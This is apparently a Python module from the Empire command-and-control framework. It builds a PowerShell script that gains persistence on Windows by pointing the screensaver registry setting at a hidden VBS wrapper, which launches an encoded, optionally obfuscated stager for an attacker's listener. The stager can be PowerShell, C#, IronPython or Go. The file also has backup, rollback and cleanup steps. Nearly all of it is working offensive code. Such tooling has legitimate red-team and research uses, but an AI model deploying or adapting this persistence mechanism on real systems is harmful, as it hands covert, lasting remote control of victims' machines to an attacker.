from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule

_BACKUP_KEY = "HKCU:\\Software\\Empire\\ScreensaverBackup"
_DESKTOP_KEY = "HKCU:\\Control Panel\\Desktop"
_BACKED_UP_VALUES = (
    "SCRNSAVE.EXE",
    "ScreenSaveActive",
    "ScreenSaverTimeout",
    "ScreenSaverIsSecure",
)


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        listener_name = params["Listener"]
        language = params["Language"]
        script_path = params["ScriptPath"]
        timeout = params["Timeout"]
        cleanup = params["Cleanup"]
        obf = params["Obfuscate"].lower() == "true"
        obf_cmd = params["ObfuscateCommand"]
        bypasses = params["Bypasses"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        if cleanup.lower() == "true":
            script = (
                "$scriptFile = $ExecutionContext.InvokeCommand.ExpandString('"
                + script_path
                + "');\n"
                "$regPath = '" + _DESKTOP_KEY + "';\n"
                "$backupKey = '" + _BACKUP_KEY + "';\n"
                "Remove-Item -Path $scriptFile -Force -ErrorAction SilentlyContinue;\n"
                "if (Test-Path $backupKey) {\n"
                "    $backup = Get-ItemProperty -Path $backupKey;\n"
                "    foreach ($name in 'SCRNSAVE.EXE','ScreenSaveActive','ScreenSaverTimeout','ScreenSaverIsSecure') {\n"
                "        if ($backup.PSObject.Properties.Name -contains $name) {\n"
                "            Set-ItemProperty -Path $regPath -Name $name -Value $backup.$name;\n"
                "        } else {\n"
                "            Remove-ItemProperty -Path $regPath -Name $name -ErrorAction SilentlyContinue;\n"
                "        }\n"
                "    }\n"
                "    Remove-Item -Path $backupKey -Recurse -Force;\n"
                "    Write-Output '[+] Restored original screensaver settings from backup.';\n"
                "} else {\n"
                "    Set-ItemProperty -Path $regPath -Name 'SCRNSAVE.EXE' -Value '' -ErrorAction SilentlyContinue;\n"
                "    Set-ItemProperty -Path $regPath -Name 'ScreenSaveActive' -Value '0' -ErrorAction SilentlyContinue;\n"
                "    Write-Output '[!] No backup found; cleared SCRNSAVE.EXE and disabled screensaver.';\n"
                "}\n"
                "Write-Output '[+] Screensaver persistence removed.'"
            )

            return main_menu.modulesv2.finalize_module(
                script=script,
                script_end="",
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
            )

        if not listener_name:
            raise ModuleValidationException("Listener is required.")

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        if not script_path.lower().endswith(".vbs"):
            raise ModuleValidationException(
                "ScriptPath must end in .vbs so wscript.exe selects the VBScript engine."
            )

        try:
            int(timeout)
        except ValueError as e:
            raise ModuleValidationException(
                f"Timeout must be an integer (seconds), got: {timeout}"
            ) from e

        lang = language.lower()
        try:
            if lang == "powershell":
                launcher = main_menu.stagergenv2.generate_launcher(
                    listener_name=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    user_agent=user_agent,
                    proxy=proxy,
                    proxy_creds=proxy_creds,
                    bypasses=bypasses,
                )
            elif lang in ("csharp", "ironpython"):
                launcher = main_menu.stagergenv2.generate_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            elif lang == "go":
                launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            else:
                raise ModuleValidationException(f"Language '{language}' not supported.")
        except ModuleValidationException:
            raise
        except Exception as e:
            raise ModuleValidationException(
                f"[!] Launcher generation failed for {language}: {e}"
            ) from e

        if not launcher or not launcher.strip():
            raise ModuleValidationException("[!] Error in launcher command generation.")

        # Build the VBS wrapper. VBS string literals escape " as "".
        vbs_launcher = launcher.replace('"', '""')
        vbs_body = 'CreateObject("WScript.Shell").Run "' + vbs_launcher + '", 0, False'
        # Escape for PowerShell single-quoted string (double single quotes).
        vbs_ps_escaped = vbs_body.replace("'", "''")

        script = (
            "$scriptFile = $ExecutionContext.InvokeCommand.ExpandString('"
            + script_path
            + "');\n"
            "$regPath = '" + _DESKTOP_KEY + "';\n"
            "$backupKey = '" + _BACKUP_KEY + "';\n"
            # Write the VBS wrapper
            "try {\n"
            "    [System.IO.File]::WriteAllText($scriptFile, '"
            + vbs_ps_escaped
            + "');\n"
            "} catch {\n"
            '    Write-Output "[-] Failed to write VBS wrapper: $_"; return;\n'
            "}\n"
            'Write-Output "[+] Wrote VBS wrapper to: $scriptFile";\n'
            # Back up existing Desktop values
            "New-Item -Path $backupKey -Force | Out-Null;\n"
            "foreach ($name in 'SCRNSAVE.EXE','ScreenSaveActive','ScreenSaverTimeout','ScreenSaverIsSecure') {\n"
            "    $existing = Get-ItemProperty -Path $regPath -Name $name -ErrorAction SilentlyContinue;\n"
            "    if ($existing) {\n"
            "        Set-ItemProperty -Path $backupKey -Name $name -Value $existing.$name;\n"
            "    }\n"
            "}\n"
            "Write-Output '[+] Backed up original screensaver settings.';\n"
            # Rollback scriptblock -- runs if any write/verify step fails
            "$rollback = {\n"
            "    Remove-Item -Path $scriptFile -Force -ErrorAction SilentlyContinue;\n"
            "    if (Test-Path $backupKey) {\n"
            "        $bk = Get-ItemProperty -Path $backupKey;\n"
            "        foreach ($name in 'SCRNSAVE.EXE','ScreenSaveActive','ScreenSaverTimeout','ScreenSaverIsSecure') {\n"
            "            if ($bk.PSObject.Properties.Name -contains $name) {\n"
            "                Set-ItemProperty -Path $regPath -Name $name -Value $bk.$name -ErrorAction SilentlyContinue;\n"
            "            } else {\n"
            "                Remove-ItemProperty -Path $regPath -Name $name -ErrorAction SilentlyContinue;\n"
            "            }\n"
            "        }\n"
            "        Remove-Item -Path $backupKey -Recurse -Force -ErrorAction SilentlyContinue;\n"
            "    }\n"
            "    Write-Output '[*] Rolled back partial screensaver install.';\n"
            "};\n"
            # Apply new values. Windows appends /s (show) or /p <hwnd> (preview)
            # to SCRNSAVE.EXE when activating; wscript treats unknown positional
            # args as script args and ignores them (our .vbs takes no args).
            "$scrValue = '\"' + \"$env:SystemRoot\\System32\\wscript.exe\" + '\" \"' + $scriptFile + '\"';\n"
            "try {\n"
            "    Set-ItemProperty -Path $regPath -Name 'SCRNSAVE.EXE' -Value $scrValue -ErrorAction Stop;\n"
            "    Set-ItemProperty -Path $regPath -Name 'ScreenSaveActive' -Value '1' -ErrorAction Stop;\n"
            "    Set-ItemProperty -Path $regPath -Name 'ScreenSaverTimeout' -Value '"
            + timeout
            + "' -ErrorAction Stop;\n"
            "    Set-ItemProperty -Path $regPath -Name 'ScreenSaverIsSecure' -Value '0' -ErrorAction Stop;\n"
            "} catch {\n"
            '    Write-Output "[-] Registry write failed: $_";\n'
            "    & $rollback;\n"
            "    return;\n"
            "};\n"
            # Verify
            "$props = Get-ItemProperty -Path $regPath;\n"
            "if ($props.'SCRNSAVE.EXE' -ne $scrValue -or\n"
            "    $props.ScreenSaveActive -ne '1' -or\n"
            "    $props.ScreenSaverTimeout -ne '" + timeout + "') {\n"
            '    Write-Output "[-] Verification failed: values do not match what was set.";\n'
            "    & $rollback;\n"
            "    return;\n"
            "};\n"
            'Write-Output "[+] Screensaver persistence configured.";\n'
            'Write-Output "[*]   Wrapper: $scriptFile";\n'
            'Write-Output "[*]   SCRNSAVE.EXE: $scrValue";\n'
            'Write-Output "[*]   Timeout: ' + timeout + ' seconds"'
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
